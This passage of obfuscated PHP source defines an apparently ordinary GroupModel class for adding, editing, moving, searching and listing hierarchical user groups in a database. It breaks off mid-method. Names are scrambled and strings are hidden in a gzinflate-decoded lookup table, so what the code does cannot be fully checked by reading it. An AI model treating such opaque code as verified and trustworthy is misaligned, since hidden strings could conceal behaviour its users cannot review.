(!CacheLock::fileLock($Õç¾ûü[9])) { return !1; } $‹êíËíîâ = parent::query($¶ö° ­ª¶‹Š); CacheLock::fileUnLock($Õç¾ûü[9]); return $‹êíËíîâ; } public function execute($ĞÜ¨¬Ç€œ) { $‚ê =& $_SERVER[ÀÆ]; if (!CacheLock::fileLock($‚ê[9])) { return !1; } $Ğç°¿Ã¹ø = parent::execute($ĞÜ¨¬Ç€œ); CacheLock::fileUnLock($‚ê[9]); return $Ğç°¿Ã¹ø; } } goto Dİ¼¸ŞÜèÁ; a”¶ì¬«ñ: define($_SERVER[ÀÆ][0], $_SERVER[ÀÆ][1]); $_SERVER[øêŞ] = explode($_SERVER[ÀÆ][2], gzinflate(substr($_SERVER[ÀÆ][3], 10, -8))); function binCheckEq($©, $¨ù÷) { return $© == $¨ù÷; } goto eœé­§•Úà; BµíŠ”»: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\x6d\145" => "\147\x72\157\165\x70\137\x6d\145\x74\141", "\155\145\164\x61\x46\x69\x65\x6c\x64" => "\147\x72\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($ää·–ğ) { $»à =& $_SERVER[ÀÆ]; return array($»à[1816] => array($ää·–ğ[0], $»à[1817]), $»à[1818] => array($ää·–ğ[0], $»à[1819])); } protected function getInfo($“Î, $¹¦á = false) { $¡ôï²ØÀ = $this->getInfoSimple($“Î); if (!$¡ôï²ØÀ) { return !1; } if ($¹¦á) { return $this->_listDataApplyItem($¡ôï²ØÀ); } return $this->cacheFunctionGet($_SERVER[ÀÆ][1820], $“Î); } protected function getInfoSimple($§³, $º“ÛøÑë›£Ú = false) { $¦¬…÷Â¹ =& $_SERVER[ÀÆ]; if ($º“ÛøÑë›£Ú) { $–ËÂ²›Ò = array($¦¬…÷Â¹[1739] => intval($§³)); $‹’¹°à³¶ÀÛÔ = $this->where($–ËÂ²›Ò)->find(); return is_array($‹’¹°à³¶ÀÛÔ) ? $‹’¹°à³¶ÀÛÔ : array(); } return $this->cacheFunctionGet($¦¬…÷Â¹[1821], $§³); } protected function groupAdd($®Œ’ü·œù) { $»ğÆ =& $_SERVER[ÀÆ]; if (!$®Œ’ü·œù[$»ğÆ[492]] && isset($®Œ’ü·œù[$»ğÆ[1739]]) && $®Œ’ü·œù[$»ğÆ[1739]] == 1) { if ($ Ö…¡³Ó = $this->getInfoSimple($®Œ’ü·œù[$»ğÆ[1739]], !0)) { return $®Œ’ü·œù[$»ğÆ[1739]]; } } else { $ Ö…¡³Ó = $this->getInfoSimple($®Œ’ü·œù[$»ğÆ[492]]); if (!$ Ö…¡³Ó) { return !1; } } $åª¶–ëÃ´ı = $»ğÆ[525]; if ($ Ö…¡³Ó[$»ğÆ[515]]) { $åª¶–ëÃ´ı = $ Ö…¡³Ó[$»ğÆ[515]] . $ Ö…¡³Ó[$»ğÆ[1739]] . $»ğÆ[47]; } $Á¶ = array($»ğÆ[415] => $this->groupNameAuto($®Œ’ü·œù[$»ğÆ[492]], $®Œ’ü·œù[$»ğÆ[28]]), $»ğÆ[396] => $®Œ’ü·œù[$»ğÆ[492]], $»ğÆ[578] => $åª¶–ëÃ´ı, $»ğÆ[1822] => $®Œ’ü·œù[$»ğÆ[1725]], $»ğÆ[1823] => 0, $»ğÆ[1743] => 0); if (isset($®Œ’ü·œù[$»ğÆ[1762]])) { $Á¶[$»ğÆ[1762]] = $®Œ’ü·œù[$»ğÆ[1762]]; } else { $¢Í´åŠ‚ = $this->max($»ğÆ[1762]); if (!$¢Í´åŠ‚) { $¢Í´åŠ‚ = 0; } $Á¶[$»ğÆ[1762]] = $¢Í´åŠ‚ + 1; } if (!empty($®Œ’ü·œù[$»ğÆ[1739]])) { $Á¶[$»ğÆ[1739]] = $®Œ’ü·œù[$»ğÆ[1739]]; } $û†ê = $this->add($Á¶); $this->setNamePinyin($û†ê, $Á¶[$»ğÆ[28]]); if (isset($®Œ’ü·œù[$»ğÆ[1824]])) { $this->metaSet($û†ê, array($»ğÆ[1824] => $®Œ’ü·œù[$»ğÆ[1824]], $»ğÆ[1825] => $®Œ’ü·œù[$»ğÆ[1825]])); unset($®Œ’ü·œù[$»ğÆ[1824]]); unset($®Œ’ü·œù[$»ğÆ[1825]]); } Model($»ğÆ[1250])->groupRootAdd($û†ê); return $û†ê; } protected function groupEdit($Ÿ‡àæğ º‰­, $İÔè©á) { $È¾Ìµ¾Û =& $_SERVER[ÀÆ]; $¶ÍÏºà‹áÊ… = $this->getInfoSimple($Ÿ‡àæğ º‰­); if (!$¶ÍÏºà‹áÊ…) { return !1; } if (!empty($İÔè©á[$È¾Ìµ¾Û[492]])) { $¢î = $this->getInfoSimple($İÔè©á[$È¾Ìµ¾Û[492]]); if (!$¢î) { return !1; } if ($¶ÍÏºà‹áÊ…[$È¾Ìµ¾Û[1739]] == $¢î[$È¾Ìµ¾Û[1739]]) { return !1; } if ($İÔè©á[$È¾Ìµ¾Û[492]] != $¶ÍÏºà‹áÊ…[$È¾Ìµ¾Û[492]]) { if ($¢î[$È¾Ìµ¾Û[515]] !== $¶ÍÏºà‹áÊ…[$È¾Ìµ¾Û[515]] && strpos($¢î[$È¾Ìµ¾Û[515]], $¶ÍÏºà‹áÊ…[$È¾Ìµ¾Û[515]] . $¶ÍÏºà‹áÊ…[$È¾Ìµ¾Û[1739]] . $È¾Ìµ¾Û[47]) === 0) { return !1; } $İÔè©á[$È¾Ìµ¾Û[578]] = $¢î[$È¾Ìµ¾Û[515]] . $İÔè©á[$È¾Ìµ¾Û[492]] . $È¾Ìµ¾Û[47]; $this->_changeChildLevel($¶ÍÏºà‹áÊ…, $¢î); } } if (isset($İÔè©á[$È¾Ìµ¾Û[28]])) { $this->setNamePinyin($Ÿ‡àæğ º‰­, $İÔè©á[$È¾Ìµ¾Û[28]]); } if (isset($İÔè©á[$È¾Ìµ¾Û[1824]])) { $this->metaSet($Ÿ‡àæğ º‰­, array($È¾Ìµ¾Û[1824] => $İÔè©á[$È¾Ìµ¾Û[1824]], $È¾Ìµ¾Û[1825] => $İÔè©á[$È¾Ìµ¾Û[1825]])); unset($İÔè©á[$È¾Ìµ¾Û[1824]]); unset($İÔè©á[$È¾Ìµ¾Û[1825]]); } $this->_clearChildrenCache($¶ÍÏºà‹áÊ…); return $this->where(array($È¾Ìµ¾Û[1826] => $Ÿ‡àæğ º‰­))->save($İÔè©á); } private function _clearChildrenCache($îô¸İÎÊËó) { $û¶®ä¥» =& $_SERVER[ÀÆ]; $©ê·Ù = array($û¶®ä¥»[578] => array($û¶®ä¥»[538], $îô¸İÎÊËó[$û¶®ä¥»[515]] . $îô¸İÎÊËó[$û¶®ä¥»[1739]] . $û¶®ä¥»[539])); $Ù¨åßî = $this->field($û¶®ä¥»[1739])->where($©ê·Ù)->select(); foreach ($Ù¨åßî as $ñ’ËÕî) { $this->_clearCache($ñ’ËÕî[$û¶®ä¥»[1739]]); } } private function _clearCache($ÅÅØçÇ¨Ê¬) { $‰„ï =& $_SERVER[ÀÆ]; $this->cacheFunctionClear($‰„ï[1820], $ÅÅØçÇ¨Ê¬); $this->cacheFunctionClear($‰„ï[1821], $ÅÅØçÇ¨Ê¬); } private function _changeChildLevel($¬¶øÓ, $àïÒ˜ÎöÇ, $Š¡ÀÏê = false) { $óÁÕ =& $_SERVER[ÀÆ]; $ü÷êï» = $¬¶øÓ[$óÁÕ[515]] . $¬¶øÓ[$óÁÕ[1739]] . $óÁÕ[47]; $Ïñ¬ = $àïÒ˜ÎöÇ[$óÁÕ[515]] . $àïÒ˜ÎöÇ[$óÁÕ[1739]] . $óÁÕ[47] . $¬¶øÓ[$óÁÕ[1739]] . $óÁÕ[47]; if ($Š¡ÀÏê) { $Ïñ¬ = $àïÒ˜ÎöÇ[$óÁÕ[515]] . $àïÒ˜ÎöÇ[$óÁÕ[1739]] . $óÁÕ[47]; } $´š«ôÅº± = array($óÁÕ[578] => array($óÁÕ[538], $¬¶øÓ[$óÁÕ[515]] . $¬¶øÓ[$óÁÕ[1739]] . $óÁÕ[539])); $Ãç„¸ˆÓ¢â… = array($óÁÕ[578] => array($óÁÕ[587], "\x72\145\160\154\141\143\145\x28\160\141\162\145\x6e\x74\x4c\145\x76\145\154\x2c\x27{$ü÷êï»}\47\54\x27{$Ïñ¬}\47\x29")); $this->_clearChildrenCache($¬¶øÓ); $this->where($´š«ôÅº±)->data($Ãç„¸ˆÓ¢â…)->save(); } public function setNamePinyin($¬Í®Ÿê™‡, $˜ë‘‹ = false) { $É¼Ø†ğøîñ¦° =& $_SERVER[ÀÆ]; if (!$˜ë‘‹) { $Ç°å¡ñ” = $this->getInfoSimple($¬Í®Ÿê™‡); $˜ë‘‹ = $Ç°å¡ñ”[$É¼Ø†ğøîñ¦°[28]]; } if (!Input::check($˜ë‘‹, $É¼Ø†ğøîñ¦°[581])) { $this->metaSet($¬Í®Ÿê™‡, $É¼Ø†ğøîñ¦°[458], null); $this->metaSet($¬Í®Ÿê™‡, $É¼Ø†ğøîñ¦°[457], null); return; } $ÉÒš‹·”• = array($É¼Ø†ğøîñ¦°[458] => str_replace($É¼Ø†ğøîñ¦°[50], $É¼Ø†ğøîñ¦°[33], Pinyin::get($˜ë‘‹)), $É¼Ø†ğøîñ¦°[457] => Pinyin::get($˜ë‘‹, $É¼Ø†ğøîñ¦°[582])); $this->metaSet($¬Í®Ÿê™‡, $ÉÒš‹·”•); } protected function groupStatus($ÀÈİ, $ûø) { $½¤Ÿ =& $_SERVER[ÀÆ]; $ä”½’œ¹å = $this->getInfoSimple($ÀÈİ); if (!$ä”½’œ¹å) { return !1; } if ($ûø == $½¤Ÿ[87]) { $ÇÆúŒÛª = $this->parentLevelArray($ä”½’œ¹å[$½¤Ÿ[515]]); } else { $êúûËéÜ = array($½¤Ÿ[578] => array($½¤Ÿ[538], $ä”½’œ¹å[$½¤Ÿ[515]] . $ä”½’œ¹å[$½¤Ÿ[1739]] . $½¤Ÿ[539])); $ÇÆúŒÛª = $this->where($êúûËéÜ)->field($½¤Ÿ[1739])->select(); $ÇÆúŒÛª = array_to_keyvalue($ÇÆúŒÛª, $½¤Ÿ[33], $½¤Ÿ[1739]); } $ÇÆúŒÛª[] = $ä”½’œ¹å[$½¤Ÿ[1739]]; $Ú“³–íÎ = array(); foreach ($ÇÆúŒÛª as $ÀÈİ) { $Ú“³–íÎ[] = array($½¤Ÿ[1739] => $ÀÈİ, $½¤Ÿ[93] => $½¤Ÿ[735], $½¤Ÿ[372] => $ûø); $this->_clearCache($ÀÈİ); } return Model($½¤Ÿ[1827])->addAll($Ú“³–íÎ, array(), !0); } protected function groupRemove($ü”²©¼ïº”Í) { $´—ù‘Ïêú =& $_SERVER[ÀÆ]; $¤¤áÌÙ»Ğ“Üé = array($´—ù‘Ïêú[1739] => $ü”²©¼ïº”Í); $® Ú¤Ë÷œ§Ã = $this->where($¤¤áÌÙ»Ğ“Üé)->find(); if (!$® Ú¤Ë÷œ§Ã || $® Ú¤Ë÷œ§Ã[$´—ù‘Ïêú[492]] == 0) { return !1; } $ÂÚ áİ = $this->getInfoSimple($® Ú¤Ë÷œ§Ã[$´—ù‘Ïêú[492]]); $this->_changeChildLevel($® Ú¤Ë÷œ§Ã, $ÂÚ áİ, !0); $this->where(array($´—ù‘Ïêú[492] => $ü”²©¼ïº”Í))->save(array($´—ù‘Ïêú[492] => $® Ú¤Ë÷œ§Ã[$´—ù‘Ïêú[492]])); Model($´—ù‘Ïêú[1827])->where($¤¤áÌÙ»Ğ“Üé)->delete(); Model($´—ù‘Ïêú[1828])->where($¤¤áÌÙ»Ğ“Üé)->delete(); Model($´—ù‘Ïêú[817])->groupRootRemove($ü”²©¼ïº”Í); return $this->where($¤¤áÌÙ»Ğ“Üé)->delete(); } protected function groupSort($ü‡¢«•ÙÁø) { $åÖ‡è÷Å÷…‡å =& $_SERVER[ÀÆ]; $¬İˆ = array(); foreach ($ü‡¢«•ÙÁø as $¸‹°Å => $†üî¢–) { $¬İˆ[] = array($åÖ‡è÷Å÷…‡å[1739], $†üî¢–, $åÖ‡è÷Å÷…‡å[1762], $¸‹°Å + 1); } $this->saveAll($¬İˆ); } public function listData() { $¤ñªä¹˜ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¤ñªä¹˜[$_SERVER[ÀÆ][367]]); return $¤ñªä¹˜; } private function _makeOrder($ÚÀµâ¥•õ = '') { $Ÿë =& $_SERVER[ÀÆ]; $Ç‘Âüüí = array($Ÿë[1739], $Ÿë[28], $Ÿë[1727], $Ÿë[194]); $Ë÷á¶²¢« = array($Ÿë[442] => $Ÿë[443], $Ÿë[444] => $Ÿë[445]); $·é = Input::get($Ÿë[449], $Ÿë[7], $Ÿë[1743], $Ç‘Âüüí); $ÒÅ€Çé×§„ = Input::get($Ÿë[450], $Ÿë[7], $Ÿë[1829], array($Ÿë[1829], $Ÿë[444])); $ÒÅ€Çé×§„ = $Ë÷á¶²¢«[$ÒÅ€Çé×§„]; $ÚÀµâ¥•õ = $ÚÀµâ¥•õ . "{$·é}\40{$ÒÅ€Çé×§„}\x2c\40\x67\x72\x6f\x75\x70\111\x44\40\141\x73\143"; return $this->order($ÚÀµâ¥•õ); } public function listChild($ñİØŞ”©µØ£Ó) { $¼òõ¹°¢›ìä‡ =& $_SERVER[ÀÆ]; $ô = $this->where(array($¼òõ¹°¢›ìä‡[492] => $ñİØŞ”©µØ£Ó))->_makeOrder()->selectPage(200); $this->_listDataApply($ô[$¼òõ¹°¢›ìä‡[367]]); return $ô; } public function listByID($ÓôõÈœöºÏÉ) { $•íê·•ç¢ÎŸ =& $_SERVER[ÀÆ]; if (!$ÓôõÈœöºÏÉ) { return array(); } $’í¸¾°ıˆ = array($•íê·•ç¢ÎŸ[1739] => array($•íê·•ç¢ÎŸ[7], $ÓôõÈœöºÏÉ)); $º„ì¤ = $this->where($’í¸¾°ıˆ)->select(); $º„ì¤ = array_sort_keep($º„ì¤, $•íê·•ç¢ÎŸ[1739], $ÓôõÈœöºÏÉ); $this->_listDataApply($º„ì¤); return $º„ì¤; } public function listSearch($‚½›ÜŞ) { $Öâ  =& $_SERVER[ÀÆ]; $éÌ¼¸šÇúğ€ = $‚½›ÜŞ[$Öâ [1830]]; $”¦ = isset($‚½›ÜŞ[$Öâ [1831]]) ? $‚½›ÜŞ[$Öâ [1831]] : !1; if (!trim($éÌ¼¸šÇúğ€)) { return !1; } $éÌ¼¸šÇúğ€ = str_replace($Öâ [1832], $Öâ [1833], $éÌ¼¸šÇúğ€); $ØÖø™ = array($Öâ [1739] => array($Öâ [381], "{$éÌ¼¸šÇúğ€}\45"), $Öâ [28] => array($Öâ [381], "\45{$éÌ¼¸šÇúğ€}\45"), $Öâ [991] => $Öâ [1834]); if ($”¦) { $ÁÇ¶æ»Â = $this->getInfoSimple($”¦); $§şÌ¦¼ÜÙÇ¬ = $ÁÇ¶æ»Â[$Öâ [515]] . $”¦ . $Öâ [539]; $ØÖø™ = array($ØÖø™, array($Öâ [515] => array($Öâ [381], $§şÌ¦¼ÜÙÇ¬))); } $ØÖø™ = $this->parseWhereLike($ØÖø™); $º±¨¨Ç¦ = $this->_makeOrder()->where($ØÖø™)->selectPage(20); $º±¨¨Ç¦ = $º±¨¨Ç¦ ? $º±¨¨Ç¦ : array($Öâ [367] => array(), $Öâ [364] => array()); if (!$º±¨¨Ç¦ || count($º±¨¨Ç¦[$Öâ [367]]) < 5 && Input::check($éÌ¼¸šÇúğ€, $Öâ [316])) { $êÑ´Ì = $this->groupChildrenAll($”¦); $ ’ãø = $this->_searchFromMeta($Öâ [457], $éÌ¼¸šÇúğ€, 10, $êÑ´Ì); $Ù´äıÌ¡ŞĞŸ = $this->_searchFromMeta($Öâ [458], $éÌ¼¸šÇúğ€, 10, $êÑ´Ì); $ˆï– = array_merge($ ’ãø, $Ù´äıÌ¡ŞĞŸ, $º±¨¨Ç¦[$Öâ [367]]); $º±¨¨Ç¦[$Öâ [367]] = array_unique_by_key($ˆï–, $Öâ [1739]); $º±¨¨Ç¦[$Öâ [364]][$Öâ [365]] = count($º±¨¨Ç¦[$Öâ [367]]); $º±¨¨Ç¦[$Öâ [364]][$Öâ [366]] = ceil($º±¨¨Ç¦[$Öâ [364]][$Öâ [365]] / $º±¨¨Ç¦[$Öâ [364]][$Öâ [361]]); } $this->_listDataApply($º±¨¨Ç¦[$Öâ [367]]); return $º±¨¨Ç¦; } protected function groupChildrenAll($™ƒï„Ò‰Œ) { $Éñ÷®²† ßÀû =& $_SERVER[ÀÆ]; if (!$™ƒï„Ò‰Œ) { return !1; } if (is_string($™ƒï„Ò‰Œ)) { $™ƒï„Ò‰Œ = array($™ƒï„Ò‰Œ); } $±¾ˆ– = $™ƒï„Ò‰Œ; foreach ($™ƒï„Ò‰Œ as $¬õ¯ô˜ª€‰¿) { $ãä = $this->getInfoSimple($¬õ¯ô˜ª€‰¿); $«ÖŸ’¿•‹’™û = array($Éñ÷®²† ßÀû[515] => array($Éñ÷®²† ßÀû[381], $ãä[$Éñ÷®²† ßÀû[515]] . $¬õ¯ô˜ª€‰¿ . $Éñ÷®²† ßÀû[539])); $ïÚ• = $this->field($Éñ÷®²† ßÀû[1739])->where($«ÖŸ’¿•‹’™û)->select(); $±¾ˆ– = array_merge($±¾ˆ–, array_to_keyvalue($ïÚ•, $Éñ÷®²† ßÀû[33], $Éñ÷®²† ßÀû[1739])); } return array_unique($±¾ˆ–); } private function _searchFromMeta($Íì™Ë, $‰Æëú¬†÷’Š, $úÂşÂ¾ÛÃá, $Ø¡Ï°Ã) { $İ”ÌØ±¡· =& $_SERVER[ÀÆ]; $‰Æëú¬†÷’Š = strtolower($‰Æëú¬†÷’Š); $ê¸½÷ø¦Œ = array($İ”ÌØ±¡·[93] => $Íì™Ë, $İ”ÌØ±¡·[372] => array($İ”ÌØ±¡·[381], "\x25{$‰Æëú¬†÷’Š}\45")); $ê¸½÷ø¦Œ = $this->parseWhereLike($ê¸½÷ø¦Œ); if ($Ø¡Ï°Ã) { $ê¸½÷ø¦Œ[$İ”ÌØ±¡·[1739]] = array($İ”ÌØ±¡·[7], $Ø¡Ï°Ã); } $ÂĞóüß«ˆ’ = Model($İ”ÌØ±¡·[1835])->where($ê¸½÷ø¦Œ)->limit($úÂşÂ¾ÛÃá)->select(); if (!$ÂĞóüß«ˆ’) { return array(); } $ÂĞóüß«ˆ’ = array_to_keyvalue($ÂĞóüß«ˆ’, $İ”ÌØ±¡·[33], $İ”ÌØ±¡·[1739]); $’ŸÃÆî²ÜŠöÑ = $this->where(array($İ”ÌØ±¡·[1826] => array($İ”ÌØ±¡·[7], $ÂĞóüß«ˆ’)))->select(); if (!$’ŸÃÆî²ÜŠöÑ) { return array(); } return $’ŸÃÆî²ÜŠöÑ; } protected function _listDataApplyItem($ï¹ïÉ’) { $ä ËÓ»ªóå = array($ï¹ïÉ’); $this->_listDataApply($ä ËÓ»ªóå); return $ä ËÓ»ªóå[0]; } protected function _listDataApply(&$¦ êğ) { $¨‘”Å¡î‘À =& $_SERVER[ÀÆ]; if (!$¦ êğ) { return; } $Ş²õÕÂ¨´ = array_to_keyvalue($¦ êğ, $¨‘”Å¡î‘À[33], $¨‘”Å¡î‘À[1739]); $this->_listAppendChildren($¦ êğ); $this->_listAppendChildrenMember($¦ êğ); $this->_listAppendMeta($¦ êğ, $Ş²õÕÂ¨´); $this->_listAppendParent($¦ êğ); $this->_listAppendSourceRoot($¦ êğ, $Ş²õÕÂ¨´); } private function _listAppendChildren(&$´ˆ£ş˜Ñ) { $Å­ÕúªÆıÙ =& $_SERVER[ÀÆ]; $éó«Æ› = array_to_keyvalue($´ˆ£ş˜Ñ, $Å­ÕúªÆıÙ[33], $Å­ÕúªÆıÙ[1739]); $‰Ü¼ = array($Å­ÕúªÆıÙ[492] => array($Å­ÕúªÆıÙ[7], $éó«Æ›)); $²šš¬Šô³Î¬ = array($Å­ÕúªÆıÙ[492], $Å­ÕúªÆıÙ[1836] => $Å­ÕúªÆıÙ[494]); $ï´øåû = $this->field($²šš¬Šô³Î¬)->where($‰Ü¼)->group($Å­ÕúªÆıÙ[492])->select(); $¢ú•±µÈ = array_to_keyvalue($ï´øåû, $Å­ÕúªÆıÙ[492], $Å­ÕúªÆıÙ[494]); foreach ($´ˆ£ş˜Ñ as &$¯š) { $ÉâÈİëß— = $¯š[$Å­ÕúªÆıÙ[1739]]; $¯š[$Å­ÕúªÆıÙ[1837]] = isset($¢ú•±µÈ[$ÉâÈİëß—]) ? intval($¢ú•±µÈ[$ÉâÈİëß—]) : !1; } unset($¯š); } private function _listAppendChildrenMember(&$˜â) { $âÖû¦áƒáà‘î =& $_SERVER[ÀÆ]; $ºõıæôËó = array_to_keyvalue($˜â, $âÖû¦áƒáà‘î[33], $âÖû¦áƒáà‘î[1739]); $èıÁ‚Ï = array($âÖû¦áƒáà‘î[1739] => array($âÖû¦áƒáà‘î[7], $ºõıæôËó)); $ùÍŒ½ñŞº = array($âÖû¦áƒáà‘î[1739], $âÖû¦áƒáà‘î[1836] => $âÖû¦áƒáà‘î[494]); $Øá = Model($âÖû¦áƒáà‘î[1828])->field($ùÍŒ½ñŞº)->where($èıÁ‚Ï)->group($âÖû¦áƒáà‘î[1739])->select(); $…öİÖİœÌ = array_to_keyvalue($Øá, $âÖû¦áƒáà‘î[1739], $âÖû¦áƒáà‘î[494]); foreach ($˜â as &$›Šğİ‰Û) { $¿öç»õø = $›Šğİ‰Û[$âÖû¦áƒáà‘î[1739]]; $›Šğİ‰Û[$âÖû¦áƒáà‘î[1838]] = isset($…öİÖİœÌ[$¿öç»õø]) ? intval($…öİÖİœÌ[$¿öç»õø]) : !1; } unset($›Šğİ‰Û); } private function _listAppendMeta(&$¤¡¼ËÁÌ®, $—ÛÃªú–»óÉä) { $ÂàÂá† =& $_SERVER[ÀÆ]; $Ù™Û”Úµ = array($ÂàÂá†[1739] => array($ÂàÂá†[7], $—ÛÃªú–»óÉä)); $ˆ¼¼ëš = Model($ÂàÂá†[1827])->where($Ù™Û”Úµ)->select(); $ˆ¼¼ëš = array_to_keyvalue_group($ˆ¼¼ëš, $ÂàÂá†[1739]); foreach ($ˆ¼¼ëš as &$¦›Ú›ï—€) { $¦›Ú›ï—€ = array_to_keyvalue($¦›Ú›ï—€, $ÂàÂá†[93], $ÂàÂá†[372]); } unset($¦›Ú›ï—€); foreach ($¤¡¼ËÁÌ® as &$İ®¡Ï‘) { $İ®¡Ï‘[$ÂàÂá†[459]] = array(); if (isset($ˆ¼¼ëš[$İ®¡Ï‘[$ÂàÂá†[1739]]])) { $İ®¡Ï‘[$ÂàÂá†[459]] = $ˆ¼¼ëš[$İ®¡Ï‘[$ÂàÂá†[1739]]]; } } unset($İ®¡Ï‘); } protected function parentLevelArray($ŒœôÊ) { $Ø“½áüËÂ‰ =& $_SERVER[ÀÆ]; $ŒœôÊ = explode($Ø“½áüËÂ‰[47], trim($ŒœôÊ, $Ø“½áüËÂ‰[47])); $ŒœôÊ = array_remove_value($ŒœôÊ, $Ø“½áüËÂ‰[191]); return $ŒœôÊ; } private function _listAppendParent(&$¶ñ»È•Èº) { $àı«– =& $_SERVER[ÀÆ]; $ÒÁ®É = array(); foreach ($¶ñ»È•Èº as &$ÍõŠËåÌÀÍË) { $ÒÁ®É[$ÍõŠËåÌÀÍË[$àı«–[1739]]] = $ÍõŠËåÌÀÍË[$àı«–[28]]; $Ô’†’Á = $this->parentLevelArray($ÍõŠËåÌÀÍË[$àı«–[515]]); foreach ($Ô’†’Á as $Õ©ü) { if (!isset($ÒÁ®É[$Õ©ü])) { $ÒÁ®É[$Õ©ü] = 0; } } } unset($ÍõŠËåÌÀÍË); foreach ($ÒÁ®É as $Æ´şî­¸ˆáí› => $ñ˜ú‚²ıò×İ) { if ($ñ˜ú‚²ıò×İ) { continue; } $ù¤¢¹êÜ• = $this->getInfoSimple($Æ´şî­¸ˆáí›); $ÒÁ®É[$Æ´şî­¸ˆáí›] = $ù¤¢¹êÜ•[$àı«–[28]]; } $»ŠÛ½ù¿ã = $GLOBALS[$àı«–[6]][$àı«–[88]][$àı«–[1839]]; if ($GLOBALS[$àı«–[499]] == $àı«–[87]) { $»ŠÛ½ù¿ã = !1; } foreach ($¶ñ»È•Èº as &$ÍõŠËåÌÀÍË) { $Ô’†’Á = $this->parentLevelArray($ÍõŠËåÌÀÍË[$àı«–[515]]); $•ğê¥Õş = $àı«–[33]; foreach ($Ô’†’Á as $Æ´şî­¸ˆáí› => $Õ©ü) { if ($»ŠÛ½ù¿ã && $Æ´şî­¸ˆáí› == 0) { continue; } $•ğê¥Õş .= $ÒÁ®É[$Õ©ü] . $àı«–[8]; } if ($Ô’†’Á) { $•ğê¥Õş .= $ÍõŠËåÌÀÍË[$àı«–[28]]; } $ÍõŠËåÌÀÍË[$àı«–[520]] = str_replace($àı«–[523], $àı«–[8], $•ğê¥Õş); } unset($ÍõŠËåÌÀÍË); } private function _listAppendSourceRoot(&$ñå¼ĞœÂ­ô, $¬‹ÀğÔ‘§) { $Â½ =& $_SERVER[ÀÆ]; $€·ˆÃå¢×ˆ = array($Â½[492] => 0, $Â½[498] => array($Â½[7], $¬‹ÀğÔ‘§), $Â½[406] => SourceModel::TYPE_GROUP); $àÛİ®‡úŞœ½ = Model($Â½[817])->order($Â½[1840])->field($Â½[1841]); $Ûêè = $àÛİ®‡úŞœ½->limit(count($¬‹ÀğÔ‘§))->where($€·ˆÃå¢×ˆ)->select(); $Ûêè = array_to_keyvalue($Ûêè, $Â½[498]); $Ûêè = array_remove_key($Ûêè, $Â½[498]); foreach ($ñå¼ĞœÂ­ô as &$Ê ×Û¹ß) { $Ê ×Û¹ß[$Â½[85]] = $Ûêè[$Ê ×Û¹ß[$Â½[1739]]] ? $Ûêè[$Ê ×Û¹ß[$Â½[1739]]] : array(); } unset($Ê ×Û¹ß); } protected function groupMerge($Ö½) { $Ö½ = array_values(array_unique($Ö½)); $°§æãòÊ‡û = array(); for ($º’ÒÕ” = 0; $º’ÒÕ” < count($Ö½); $º’ÒÕ”++) { $Á = !1; for ($Úç˜ = 0; $Úç˜ < count($Ö½); $Úç˜++) { if ($º’ÒÕ” == $Úç˜) { continue; } if ($this->isParentOf($Ö½[$Úç˜], $Ö½[$º’ÒÕ”])) { $Á = !0; break; } } if (!$Á) { $°§æãòÊ‡û[] = $Ö½[$º’ÒÕ”]; } } return $°§æãòÊ‡û; } protected function isParentOf($Åëœ–, $ºµí) { $ÅşÄâ =& $_SERVER[ÀÆ]; if (!$Åëœ– || !$ºµí || $Åëœ– == $ºµí) { return !1; } $¡„Ÿó Çƒ = $this->getInfoSimple($Åëœ–); $ôÒŞĞ = $this->getInfoSimple($ºµí); $ìª™è¦Ê = $¡„Ÿó Çƒ[$ÅşÄâ[515]] . $Åëœ– . $ÅşÄâ[47]; if (substr($ôÒŞĞ[$ÅşÄâ[515]], 0, strlen($ìª™è¦Ê)) == $ìª™è¦Ê) { return !0; } return !1; } public function groupShowRoot($®•ç÷şˆŠøáõ, $°›÷Í›é• = false) { $…î°†èÓ‚Ä =& $_SERVER[ÀÆ]; $ğıÉÔßÆ„ = $this->getInfo($®•ç÷şˆŠøáõ); if (!$ğıÉÔßÆ„) { return array(); } $Ûîì¢£¿¸ÚÅ = $this->parentLevelArray($ğıÉÔßÆ„[$…î°†èÓ‚Ä[515]]); $Â”…Ñ°×¢é = array($®•ç÷şˆŠøáõ); if (count($Ûîì¢£¿¸ÚÅ) == 0) { return $Â”…Ñ°×¢é; } if ($°›÷Í›é• && count($Ûîì¢£¿¸ÚÅ) == 1) { return $Â”…Ñ°×¢é; } if (!$ğıÉÔßÆ„[$…î°†èÓ‚Ä[459]] || !isset($ğıÉÔßÆ„[$…î°†èÓ‚Ä[459]][$…î°†èÓ‚Ä[1824]]) || $ğıÉÔßÆ„[$…î°†èÓ‚Ä[459]][$…î°†èÓ‚Ä[1824]] == $…î°†èÓ‚Ä[1793]) { return $this->groupShowRoot($Ûîì¢£¿¸ÚÅ[count($Ûîì¢£¿¸ÚÅ) - 1], $°›÷Í›é•); } if ($ğıÉÔßÆ„[$…î°†èÓ‚Ä[459]][$…î°†èÓ‚Ä[1824]] == $…î°†èÓ‚Ä[355]) { $ÅÈò = explode($…î°†èÓ‚Ä[47], $ğıÉÔßÆ„[$…î°†èÓ‚Ä[459]][$…î°†èÓ‚Ä[1825]]); if ($ÅÈò) { $Â”…Ñ°×¢é = array_merge($Â”…Ñ°×¢é, $ÅÈò); } } return $Â”…Ñ°×¢é; } protected function resetParentLevel() { $ö×Ì =& $_SERVER[ÀÆ]; $Ğ ‰Ü¶ = $ö×Ì[1739]; $­Ò× = $this->select(); $­Ò× = array_to_keyvalue($­Ò×, $Ğ ‰Ü¶); foreach ($­Ò× as $•§õÌ¼ºŞÙ) { $½Şïßï¡Í  = $•§õÌ¼ºŞÙ; $ß·¦óÅ = array(); while ($½Şïßï¡Í [$ö×Ì[492]] != 0) { $ß·¦óÅ[] = $½Şïßï¡Í [$ö×Ì[492]]; $½Şïßï¡Í  = $­Ò×[$½Şïßï¡Í [$ö×Ì[492]]]; } $ß·¦óÅ[] = 0; $ß·¦óÅ = $ö×Ì[47] . implode($ö×Ì[47], array_reverse($ß·¦óÅ)) . $ö×Ì[47]; $this->setNamePinyin($•§õÌ¼ºŞÙ[$Ğ ‰Ü¶], $•§õÌ¼ºŞÙ[$ö×Ì[28]]); $this->where(array($Ğ ‰Ü¶ => $•§õÌ¼ºŞÙ[$Ğ ‰Ü¶]))->save(array($ö×Ì[578] => $ß·¦óÅ)); } return $­Ò×; } public function groupNameAuto($óŠøÃ“È›Ç, $ Ò–È) { 